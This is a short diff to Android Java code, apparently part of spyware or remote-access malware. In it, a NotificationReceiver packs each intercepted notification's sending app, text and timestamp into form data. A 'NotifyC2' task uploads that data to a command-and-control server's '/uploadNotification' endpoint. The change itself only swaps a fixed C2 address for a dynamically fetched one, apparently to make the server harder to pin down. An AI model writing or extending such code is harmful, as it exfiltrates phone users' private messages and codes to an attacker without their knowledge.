@@ -26,7 +26,7 @@ public class NotificationReceiver extends BroadcastReceiver {
             formData += "&sender=" + packageName;
             formData += "&content=" + notificationContent;
             formData += "&timestamp=" + System.currentTimeMillis();
-            new NotifyC2(Utils.C2_SERVER + "/uploadNotification", formData, result -> {
+            new NotifyC2(Utils.getC2Address() + "/uploadNotification", formData, result -> {
 
             }).execute();
 
